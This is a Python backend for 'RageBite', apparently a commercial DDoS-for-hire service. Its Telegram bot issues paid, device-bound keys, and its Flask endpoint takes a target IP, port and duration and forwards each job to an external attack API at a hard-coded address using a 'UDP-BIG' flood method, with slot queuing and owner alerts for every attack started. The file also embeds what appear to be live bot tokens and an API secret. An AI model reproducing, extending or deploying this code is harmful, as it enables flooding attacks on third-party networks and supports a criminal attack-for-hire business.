"""
⚡ RAGEBITE ALL-IN-ONE BACKEND ⚡
Verify Bot + DD Bot + Flask API + Security + Slot Management
"""

import os
import sqlite3
import random
import string
import threading
import time
import asyncio
import hashlib
from datetime import datetime, timedelta

from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests


# ============================================================
# ⚙️ CONFIGURATION — YAHAN APNI DETAILS DAALEIN
# ============================================================

# ⚠️ VERIFY BOT TOKEN (BotFather se)
VERIFY_BOT_TOKEN = "8823908635:AAHO373_iqEcipIOdhACahEO-3O-ZipA21g"

# ⚠️ DD BOT TOKEN (BotFather se)
DD_BOT_TOKEN = "8650600804:AAFw-AuiLMtbUUHIbqwdPzVeOG8s11yfdA8"

# ⚠️ APNI TELEGRAM ID (numeric)
OWNER_ID = 6321758394

# ⚠️ API SECRET (same APK me daalna hai)
API_SECRET = "RAGEBITE_SECRET_2026_CHANGE_ME"

# ⚠️ API PORT
API_PORT = 5000

# ⚠️ EXTERNAL ATTACK API
ATTACK_API_URL = "http://176.100.37.127:3001/api/v1/attack/start"
DEFAULT_METHOD = "UDP-BIG"

# ============================================================
# 📦 DATABASE
# ============================================================
DB_NAME = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'ragebite.db')

STATUS_ACTIVE = "ACTIVE"
STATUS_EXPIRED = "EXPIRED"
STATUS_DELETED = "DELETED"
STATUS_DISABLED = "DISABLED"

rate_limit_store = {}


def get_conn():
    return sqlite3.connect(DB_NAME, check_same_thread=False)


def init_db():
    conn = get_conn()
    c = conn.cursor()

    c.execute('''CREATE TABLE IF NOT EXISTS keys (
        key TEXT PRIMARY KEY,
        device_id TEXT,
        expiry TEXT,
        status TEXT DEFAULT 'ACTIVE',
        slot_count INTEGER DEFAULT 4,
        created_at TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS slots (
        slot_id INTEGER PRIMARY KEY,
        device_id TEXT,
        key TEXT,
        package_name TEXT,
        ip TEXT,
        port TEXT,
        time_sec INTEGER,
        start_time TEXT,
        end_time TEXT,
        is_active INTEGER DEFAULT 0
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS queue (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        device_id TEXT UNIQUE,
        key TEXT,
        package_name TEXT,
        ip TEXT,
        port TEXT,
        time_sec INTEGER,
        joined_at TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS servers (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT, ip TEXT, port TEXT
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS api_keys (
        name TEXT PRIMARY KEY,
        api_key TEXT NOT NULL,
        added_at TEXT,
        is_active INTEGER DEFAULT 1
    )''')

    c.execute('''CREATE TABLE IF NOT EXISTS settings (
        key TEXT PRIMARY KEY,
        value TEXT
    )''')

    c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ('maintenance', 'off'))
    c.execute('INSERT OR IGNORE INTO settings (key, value) VALUES (?, ?)', ('max_slots', '4'))

    for i in range(1, 21):
        c.execute('INSERT OR IGNORE INTO slots (slot_id, is_active) VALUES (?, 0)', (i,))

    conn.commit()
    conn.close()
    print(f"✅ Database ready: {DB_NAME}")


# ==================== SETTINGS ====================
def get_setting(key, default=None):
    conn = get_conn()
    c = conn.cursor()
    c.execute("SELECT value FROM settings WHERE key=?", (key,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else default


def set_setting(key, value):
    conn = get_conn()
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO settings (key, value) VALUES (?, ?)", (key, str(value)))
    conn.commit()
    conn.close()


def is_maintenance_on():
    return get_setting('maintenance', 'off') == 'on'


def set_maintenance(state):
    set_setting('maintenance', 'on' if state else 'off')


def get_max_slots():
    return int(get_setting('max_slots', '4'))


def set_max_slots(count):
    if count < 1 or count > 20:
        return False, "Slots 1-20 ke beech hone chahiye"

    current = get_max_slots()
    if count == current:
        return False, f"Slots already {current} hain"

    if count > current:
        conn = get_conn()
        c = conn.cursor()
        for i in range(current + 1, count + 1):
            c.execute('INSERT OR IGNORE INTO slots (slot_id, is_active) VALUES (?, 0)', (i,))
        c.execute("UPDATE settings SET value=? WHERE key='max_slots'", (str(count),))
        conn.commit()
        conn.close()
        return True, f"✅ Slots {current} → {count} (badha diye)"

    else:
        conn = get_conn()
        c = conn.cursor()
        c.execute('SELECT slot_id FROM slots WHERE slot_id > ? AND is_active = 1', (count,))
        busy = c.fetchall()
        if busy:
            conn.close()
            ids = ", ".join([f"#{s[0]}" for s in busy])
            return False, f"⚠️ Slot {ids} busy hain. Wait karein."

        c.execute('DELETE FROM slots WHERE slot_id > ?', (count,))
        c.execute("UPDATE settings SET value=? WHERE key='max_slots'", (str(count),))
        conn.commit()
        conn.close()
        return True, f"✅ Slots {current} → {count} (ghata diye)"


# ==================== RATE LIMIT ====================
def check_rate_limit(identifier, max_requests=15, window=60):
    now = time.time()
    if identifier not in rate_limit_store:
        rate_limit_store[identifier] = []

    rate_limit_store[identifier] = [
        t for t in rate_limit_store[identifier]
        if now - t < window
    ]

    if len(rate_limit_store[identifier]) >= max_requests:
        return False

    rate_limit_store[identifier].append(now)
    return True


# ==================== KEYS ====================
def generate_key(days, slot_count=4):
    if slot_count < 1 or slot_count > 4:
        slot_count = 4

    key = "LTN-1M-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=8))
    expiry = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')

    conn = get_conn()
    c = conn.cursor()
    c.execute('''INSERT INTO keys (key, device_id, expiry, status, slot_count, created_at)
                 VALUES (?, NULL, ?, ?, ?, ?)''',
              (key, expiry, STATUS_ACTIVE, slot_count,
               datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()
    return key, expiry, slot_count


def verify_key(key):
    if is_maintenance_on():
        return None, "MAINTENANCE"
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT expiry, status FROM keys WHERE key = ?', (key,))
    row = c.fetchone()
    conn.close()
    if not row:
        return None, "NOT_FOUND"
    expiry_str, status = row
    if status == STATUS_DELETED:
        return None, "DELETED"
    if status == STATUS_DISABLED:
        return None, "DISABLED"
    expiry = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    if expiry < datetime.now():
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_EXPIRED, key))
        conn.commit()
        conn.close()
        return None, "EXPIRED"
    return int(expiry.timestamp() * 1000), "VALID"


def verify_key_with_device(key, device_id):
    if is_maintenance_on():
        return None, "MAINTENANCE", False

    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT expiry, status, device_id FROM keys WHERE key = ?', (key,))
    row = c.fetchone()

    if not row:
        conn.close()
        return None, "NOT_FOUND", False

    expiry_str, status, existing_device = row

    if status == STATUS_DELETED:
        conn.close()
        return None, "DELETED", False
    if status == STATUS_DISABLED:
        conn.close()
        return None, "DISABLED", False

    expiry = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    if expiry < datetime.now():
        c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_EXPIRED, key))
        conn.commit()
        conn.close()
        return None, "EXPIRED", False

    if existing_device is None:
        c.execute('UPDATE keys SET device_id = ? WHERE key = ?', (device_id, key))
        conn.commit()
        conn.close()
        print(f"🔗 Device bound: {key[:15]}... → {device_id[:12]}...")
        return int(expiry.timestamp() * 1000), "VALID", True
    elif existing_device == device_id:
        conn.close()
        return int(expiry.timestamp() * 1000), "VALID", True
    else:
        conn.close()
        return None, "DEVICE_MISMATCH", False


def is_device_authorized(device_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('''SELECT key, expiry, status FROM keys 
                 WHERE device_id = ? ORDER BY created_at DESC LIMIT 1''', (device_id,))
    row = c.fetchone()
    conn.close()

    if not row:
        return False, None, "NO_KEY"

    key, expiry_str, status = row
    if status == STATUS_DELETED:
        return False, key, "DELETED"
    if status == STATUS_DISABLED:
        return False, key, "DISABLED"

    expiry = datetime.strptime(expiry_str, '%Y-%m-%d %H:%M:%S')
    if expiry < datetime.now():
        conn = get_conn()
        c = conn.cursor()
        c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_EXPIRED, key))
        conn.commit()
        conn.close()
        return False, key, "EXPIRED"

    return True, key, "VALID"


def delete_key(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_DELETED, key))
    conn.commit()
    conn.close()


def disable_key(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_DISABLED, key))
    conn.commit()
    conn.close()


def enable_key(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET status = ? WHERE key = ?', (STATUS_ACTIVE, key))
    conn.commit()
    conn.close()


def reset_device_binding(key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('UPDATE keys SET device_id = NULL WHERE key = ?', (key,))
    conn.commit()
    conn.close()


# ==================== SLOTS ====================
def get_free_slot():
    max_slots = get_max_slots()
    conn = get_conn()
    c = conn.cursor()
    c.execute('''SELECT slot_id FROM slots 
                 WHERE is_active=0 AND slot_id <= ? 
                 ORDER BY slot_id ASC LIMIT 1''', (max_slots,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


def allot_slot(device_id, key, package_name, ip, port, time_sec):
    conn = get_conn()
    c = conn.cursor()

    c.execute('SELECT slot_count FROM keys WHERE key = ?', (key,))
    row = c.fetchone()
    key_slot_count = row[0] if row else 4

    c.execute('SELECT COUNT(*) FROM slots WHERE key = ? AND is_active = 1', (key,))
    used_slots = c.fetchone()[0]

    if used_slots >= key_slot_count:
        conn.close()
        return None, "KEY_SLOTS_FULL"

    max_slots = get_max_slots()
    c.execute('''SELECT slot_id FROM slots 
                 WHERE is_active=0 AND slot_id <= ? 
                 ORDER BY slot_id ASC LIMIT 1''', (max_slots,))
    slot_row = c.fetchone()

    if slot_row is None:
        conn.close()
        return None, "ALL_SLOTS_FULL"

    slot_id = slot_row[0]
    start = datetime.now()
    end = start + timedelta(seconds=time_sec)

    c.execute('''UPDATE slots SET device_id=?, key=?, package_name=?, 
                 ip=?, port=?, time_sec=?, start_time=?, end_time=?, is_active=1 
                 WHERE slot_id=?''',
              (device_id, key, package_name, ip, port, time_sec,
               start.strftime('%Y-%m-%d %H:%M:%S'),
               end.strftime('%Y-%m-%d %H:%M:%S'),
               slot_id))
    conn.commit()
    conn.close()
    return slot_id, "OK"


def release_slot(slot_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('''UPDATE slots SET device_id=NULL, key=NULL, package_name=NULL,
                 ip=NULL, port=NULL, time_sec=NULL, start_time=NULL,
                 end_time=NULL, is_active=0 WHERE slot_id=?''', (slot_id,))
    conn.commit()
    conn.close()


def get_all_slots():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT * FROM slots ORDER BY slot_id')
    rows = c.fetchall()
    conn.close()
    return rows


def get_expired_slots():
    conn = get_conn()
    c = conn.cursor()
    now = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    c.execute('SELECT slot_id, device_id FROM slots WHERE is_active=1 AND end_time <= ?', (now,))
    rows = c.fetchall()
    conn.close()
    return rows


def device_has_active_slot(device_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT slot_id FROM slots WHERE device_id=? AND is_active=1', (device_id,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


# ==================== QUEUE ====================
def add_to_queue(device_id, key, package_name, ip, port, time_sec):
    conn = get_conn()
    c = conn.cursor()
    c.execute('''INSERT OR REPLACE INTO queue 
                 (device_id, key, package_name, ip, port, time_sec, joined_at)
                 VALUES (?, ?, ?, ?, ?, ?, ?)''',
              (device_id, key, package_name, ip, port, time_sec,
               datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()


def get_queue_position(device_id):
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT id FROM queue WHERE device_id=?', (device_id,))
    row = c.fetchone()
    if not row:
        conn.close()
        return None
    c.execute('SELECT COUNT(*) FROM queue WHERE id <= ?', (row[0],))
    pos = c.fetchone()[0]
    conn.close()
    return pos


def pop_next_from_queue():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT * FROM queue ORDER BY id ASC LIMIT 1')
    row = c.fetchone()
    if row:
        c.execute('DELETE FROM queue WHERE id=?', (row[0],))
        conn.commit()
    conn.close()
    return row


def get_queue_count():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT COUNT(*) FROM queue')
    count = c.fetchone()[0]
    conn.close()
    return count


# ==================== SERVERS ====================
def add_server(name, ip, port):
    conn = get_conn()
    c = conn.cursor()
    c.execute('INSERT INTO servers (name, ip, port) VALUES (?, ?, ?)', (name, ip, port))
    conn.commit()
    conn.close()


def get_random_server():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT ip, port FROM servers ORDER BY RANDOM() LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row


def get_all_servers():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT name, ip, port FROM servers')
    rows = c.fetchall()
    conn.close()
    return rows


# ==================== API KEYS ====================
def add_api_key(name, api_key):
    conn = get_conn()
    c = conn.cursor()
    c.execute('INSERT OR REPLACE INTO api_keys (name, api_key, added_at, is_active) VALUES (?, ?, ?, 1)',
              (name, api_key, datetime.now().strftime('%Y-%m-%d %H:%M:%S')))
    conn.commit()
    conn.close()


def delete_api_key(name):
    conn = get_conn()
    c = conn.cursor()
    c.execute('DELETE FROM api_keys WHERE name = ?', (name,))
    conn.commit()
    conn.close()


def get_all_api_keys():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT name, api_key, added_at FROM api_keys ORDER BY added_at DESC')
    rows = c.fetchall()
    conn.close()
    return rows


def get_active_api_key():
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT api_key FROM api_keys WHERE is_active = 1 ORDER BY added_at DESC LIMIT 1')
    row = c.fetchone()
    conn.close()
    return row[0] if row else None


# ==================== EXTERNAL ATTACK API ====================
def call_external_attack_api(ip, port, time_sec, method=None):
    if method is None:
        method = DEFAULT_METHOD
    api_key = get_active_api_key()
    if not api_key:
        return False, "No API key configured!"

    params = {"key": api_key, "ip": ip, "port": port, "time": time_sec, "method": method}
    try:
        print(f"🎯 Attack API: {ip}:{port} for {time_sec}s")
        response = requests.get(ATTACK_API_URL, params=params, timeout=15)
        print(f"📡 Response: {response.status_code}")
        if response.status_code == 200:
            return True, "Started"
        return False, f"HTTP {response.status_code}"
    except Exception as e:
        return False, f"Error: {str(e)}"


# ============================================================
# 🛡️ VERIFY BOT HANDLERS
# ============================================================
async def v_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    is_owner = update.effective_user.id == OWNER_ID
    msg = ("🛡️ *RAGEBITE VERIFY BOT* 🛡️\n\n"
           "`/verify <key>`\n"
           "`/mykey <key>`\n")
    if is_owner:
        msg += ("\n👑 *Owner:*\n"
                "`/genkey <days> [slots]`\n"
                "`/delkey <key>` | `/diskey <key>` | `/enkey <key>`\n"
                "`/resetbind <key>` | `/listkeys`\n"
                "`/maintenance on|off`\n"
                "`/setslots <count>` | `/slotson`")
    await update.message.reply_text(msg, parse_mode='Markdown')


async def v_verify(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("INVALID|NoKey")
        return
    key = context.args[0].upper().strip()
    expiry, status = verify_key(key)
    if status == "VALID":
        await update.message.reply_text(f"VALID|{expiry}")
    else:
        await update.message.reply_text(f"INVALID|{status}")


async def v_mykey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not context.args:
        await update.message.reply_text("Usage: `/mykey <key>`", parse_mode='Markdown')
        return
    key = context.args[0].upper().strip()
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT key, device_id, expiry, status, slot_count FROM keys WHERE key = ?', (key,))
    row = c.fetchone()
    c.execute('SELECT COUNT(*) FROM slots WHERE key = ? AND is_active = 1', (key,))
    used = c.fetchone()[0]
    conn.close()
    if not row:
        await update.message.reply_text("❌ Not found")
        return
    dev = row[1] if row[1] else "Not bound"
    await update.message.reply_text(
        f"🔑 *Key Info*\n\n"
        f"Key: `{row[0]}`\n"
        f"Device: `{dev[:20]}...`\n"
        f"Expiry: {row[2]}\n"
        f"Status: `{row[3]}`\n"
        f"🎯 Slots: *{used}/{row[4]}*",
        parse_mode='Markdown')


async def v_genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("🚫 Only Owner!")
        return
    if len(context.args) < 1:
        await update.message.reply_text(
            "❌ *Usage:* `/genkey <days> [slots]`\n\n"
            "*Examples:*\n"
            "`/genkey 30` — 30 din, 4 slots\n"
            "`/genkey 30 2` — 30 din, 2 slots",
            parse_mode='Markdown')
        return
    try:
        days = int(context.args[0])
        slot_count = int(context.args[1]) if len(context.args) > 1 else 4
    except ValueError:
        await update.message.reply_text("❌ Invalid")
        return
    if days < 1 or days > 3650:
        await update.message.reply_text("❌ Days 1-3650")
        return
    if slot_count < 1 or slot_count > 4:
        await update.message.reply_text("❌ Slots 1-4")
        return

    key, expiry, slots = generate_key(days, slot_count)
    await update.message.reply_text(
        f"✅ *Key Generated*\n\n"
        f"🔑 `{key}`\n"
        f"📅 Valid till: {expiry}\n"
        f"⏱️ {days} days\n"
        f"🎯 Slots: *{slots}*\n\n"
        f"User ko ye key dein.",
        parse_mode='Markdown')


async def v_delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    delete_key(context.args[0].upper())
    await update.message.reply_text("🗑️ Deleted", parse_mode='Markdown')


async def v_diskey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    disable_key(context.args[0].upper())
    await update.message.reply_text("⛔ Disabled", parse_mode='Markdown')


async def v_enkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    enable_key(context.args[0].upper())
    await update.message.reply_text("✅ Enabled", parse_mode='Markdown')


async def v_resetbind(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID or not context.args:
        return
    key = context.args[0].upper()
    reset_device_binding(key)
    await update.message.reply_text(
        f"🔄 *Device Reset*\n\nKey: `{key}`",
        parse_mode='Markdown')


async def v_maintenance(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if not context.args:
        status = "🔧 ON" if is_maintenance_on() else "✅ OFF"
        await update.message.reply_text(f"*Maintenance:* {status}", parse_mode='Markdown')
        return
    action = context.args[0].lower()
    if action == "on":
        set_maintenance(True)
        await update.message.reply_text("🔧 *MAINTENANCE ON*")
    elif action == "off":
        set_maintenance(False)
        await update.message.reply_text("✅ *MAINTENANCE OFF*")


async def v_setslots(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    if not context.args:
        current = get_max_slots()
        await update.message.reply_text(
            f"📊 *Current Slots:* {current}\n\n"
            f"Usage: `/setslots <count>`",
            parse_mode='Markdown')
        return
    try:
        count = int(context.args[0])
    except ValueError:
        await update.message.reply_text("❌ Invalid")
        return
    success, message = set_max_slots(count)
    await update.message.reply_text(message)


async def v_listkeys(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    conn = get_conn()
    c = conn.cursor()
    c.execute('SELECT key, device_id, status, slot_count FROM keys ORDER BY created_at DESC LIMIT 20')
    rows = c.fetchall()
    conn.close()
    msg = "📋 *Keys:*\n\n"
    for k in rows:
        dev = (k[1][:10] + "...") if k[1] else "Not bound"
        msg += f"`{k[0]}` — {dev} | {k[2]} | {k[3]} slots\n"
    await update.message.reply_text(msg or "❌ None", parse_mode='Markdown')


async def v_slotson(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return
    max_slots = get_max_slots()
    slots = get_all_slots()
    msg = f"📊 *LIVE SLOTS (Total: {max_slots})*\n\n"
    active = 0
    for s in slots:
        if s[0] > max_slots:
            continue
        if s[9]:
            active += 1
            rem = (datetime.strptime(s[8], '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
            dev = (s[1][:10] + "...") if s[1] else "?"
            msg += f"🔴 #{s[0]} — `{dev}` | {s[4]}:{s[5]} | {rem}s\n"
        else:
            msg += f"🟢 #{s[0]} FREE\n"
    msg += f"\n📈 {active}/{max_slots} | Queue: {get_queue_count()}"
    await update.message.reply_text(msg, parse_mode='Markdown')


# ============================================================
# 🌐 FLASK API
# ============================================================
flask_app = Flask(__name__)
CORS(flask_app)


def check_auth():
    return request.headers.get('X-API-KEY') == API_SECRET


def notify_owner_dd(text):
    try:
        requests.post(
            f"https://api.telegram.org/bot{DD_BOT_TOKEN}/sendMessage",
            json={"chat_id": OWNER_ID, "text": text, "parse_mode": "Markdown"},
            timeout=5)
    except:
        pass


@flask_app.route('/api/health', methods=['GET'])
def api_health():
    return jsonify({"status": "OK"})


@flask_app.route('/api/verify', methods=['POST'])
def api_verify():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401

    data = request.json or {}
    key = data.get('key', '').upper().strip()
    device_id = data.get('device_id', '').strip()

    if not device_id:
        return jsonify({"status": "INVALID", "reason": "NoDeviceID"})

    expiry, status, _ = verify_key_with_device(key, device_id)

    if status == "VALID":
        return jsonify({"status": "VALID", "expiry": expiry})
    return jsonify({"status": "INVALID", "reason": status})


@flask_app.route('/api/slots', methods=['GET'])
def api_slots():
    if not check_auth():
        return jsonify({"error": "Unauthorized"}), 401

    max_slots = get_max_slots()
    rows = get_all_slots()
    slots = []
    for r in rows:
        if r[0] > max_slots:
            continue
        if r[9]:
            rem = (datetime.strptime(r[8], '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
            slots.append({"slot": r[0], "status": "BUSY", "remaining": rem})
        else:
            slots.append({"slot": r[0], "status": "FREE", "remaining": 0})

    return jsonify({
        "slots": slots,
        "queue_count": get_queue_count(),
        "max_slots": max_slots
    })


@flask_app.route('/api/dd', methods=['POST'])
def api_dd():
    # Layer 1: API Key
    if not check_auth():
        print(f"🚫 Unauthorized from {request.remote_addr}")
        return jsonify({"status": "ERROR", "reason": "Unauthorized"}), 401

    # Layer 2: Rate limit
    client_ip = request.remote_addr
    if not check_rate_limit(client_ip, max_requests=15, window=60):
        print(f"🚫 Rate limit: {client_ip}")
        return jsonify({"status": "ERROR", "reason": "RateLimit"})

    data = request.json or {}
    device_id = data.get('device_id', '').strip()
    key = data.get('key', '').upper().strip()
    ip = data.get('ip', '').strip()
    port = str(data.get('port', '')).strip()
    time_sec = int(data.get('time', 0))
    pkg = data.get('package', 'unknown')

    # Layer 3: Mandatory fields
    if not device_id:
        return jsonify({"status": "ERROR", "reason": "NoDeviceID"})
    if not key:
        return jsonify({"status": "ERROR", "reason": "NoKey"})
    if not ip or not port:
        return jsonify({"status": "ERROR", "reason": "MissingIPPort"})
    if time_sec < 10 or time_sec > 300:
        return jsonify({"status": "ERROR", "reason": "InvalidTime"})

    # Layer 4: Maintenance
    if is_maintenance_on():
        return jsonify({"status": "ERROR", "reason": "MAINTENANCE"})

    # Layer 5: Key verify with device
    expiry, status, _ = verify_key_with_device(key, device_id)
    if status != "VALID":
        print(f"🚫 Key fail: {key[:15]}... | {status}")
        return jsonify({"status": "ERROR", "reason": status})

    # Layer 6: Device authorization
    authorized, user_key, reason = is_device_authorized(device_id)
    if not authorized:
        return jsonify({"status": "ERROR", "reason": reason})

    # Layer 7: Already active
    existing = device_has_active_slot(device_id)
    if existing:
        return jsonify({"status": "ERROR", "reason": "AlreadyActive", "slot": existing})

    # Layer 8: Slot allot
    slot_id, slot_status = allot_slot(device_id, key, pkg, ip, port, time_sec)

    if slot_status == "KEY_SLOTS_FULL":
        return jsonify({
            "status": "ERROR",
            "reason": "KeySlotsFull",
            "message": "Aapki key ke saare slots busy hain"
        })

    if slot_id is None:
        add_to_queue(device_id, key, pkg, ip, port, time_sec)
        slots = get_all_slots()
        slots_info = ""
        for s in slots:
            if s[9]:
                rem = (datetime.strptime(s[8], '%Y-%m-%d %H:%M:%S') - datetime.now()).seconds
                slots_info += f"🔴 Slot #{s[0]}: {rem}s left\n"
            else:
                slots_info += f"🟢 Slot #{s[0]}: FREE\n"
        return jsonify({
            "status": "SLOTS_FULL",
            "queue_position": get_queue_position(device_id),
            "queue_total": get_queue_count(),
            "slots_info": slots_info
        })

    # Layer 9: Attack API
    success, message = call_external_attack_api(ip, port, time_sec)
    if not success:
        release_slot(slot_id)
        return jsonify({"status": "ERROR", "reason": "AttackFailed", "message": message})

    notify_owner_dd(
        f"⚔️ *Attack Started*\n\n"
        f"🎯 Slot: #{slot_id}\n"
        f"🔑 Key: `{key[:15]}...`\n"
        f"🌐 IP: `{ip}:{port}`\n"
        f"⏱️ Time: {time_sec}s"
    )

    end = datetime.now() + timedelta(seconds=time_sec)
    return jsonify({
        "status": "SLOT_ALLOTTED",
        "slot": slot_id,
        "ip": ip,
        "port": port,
        "time": time_sec,
        "end_time": end.strftime('%H:%M:%S')
    })


# ============================================================
# 🔄 AUTO-RELEASE LOOP
# ============================================================
async def auto_release_loop(application):
    while True:
        try:
            for slot_id, device_id in get_expired_slots():
                release_slot(slot_id)
                print(f"✅ Released Slot #{slot_id}")
                try:
                    await application.bot.send_message(
                        chat_id=OWNER_ID,
                        text=f"⏰ Slot #{slot_id} free"
                    )
                except:
                    pass

                nxt = pop_next_from_queue()
                if nxt:
                    _, did, k, pkg, ip, port, t, _ = nxt
                    authorized, kk, _ = is_device_authorized(did)
                    if not authorized:
                        continue
                    new_slot, _ = allot_slot(did, kk, pkg, ip, port, t)
                    if new_slot:
                        call_external_attack_api(ip, port, t)
                        print(f"✅ Queue auto-attack: Slot #{new_slot}")
        except Exception as e:
            print(f"Auto-release: {e}")
        await asyncio.sleep(5)


async def post_init(application):
    asyncio.create_task(auto_release_loop(application))


def run_flask():
    flask_app.run(host='0.0.0.0', port=API_PORT, debug=False, use_reloader=False)


# ============================================================
# 🚀 MAIN
# ============================================================
def main():
    init_db()

    print("=" * 60)
    print("🛡️ RAGEBITE VERIFY BOT + API")
    print("=" * 60)

    threading.Thread(target=run_flask, daemon=True).start()
    print(f"🌐 Flask API on port {API_PORT}")
    time.sleep(1)

    v_app = Application.builder().token(VERIFY_BOT_TOKEN).post_init(post_init).build()
    v_app.add_handler(CommandHandler("start", v_start))
    v_app.add_handler(CommandHandler("verify", v_verify))
    v_app.add_handler(CommandHandler("mykey", v_mykey))
    v_app.add_handler(CommandHandler("genkey", v_genkey))
    v_app.add_handler(CommandHandler("delkey", v_delkey))
    v_app.add_handler(CommandHandler("diskey", v_diskey))
    v_app.add_handler(CommandHandler("enkey", v_enkey))
    v_app.add_handler(CommandHandler("resetbind", v_resetbind))
    v_app.add_handler(CommandHandler("maintenance", v_maintenance))
    v_app.add_handler(CommandHandler("setslots", v_setslots))
    v_app.add_handler(CommandHandler("listkeys", v_listkeys))
    v_app.add_handler(CommandHandler("slotson", v_slotson))

    print("🛡️ Verify Bot running...")
    print("=" * 60)
    print("⚠️  DD Bot ke liye alag terminal me `dd_bot.py` chalayein")
    print("=" * 60)

    v_app.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
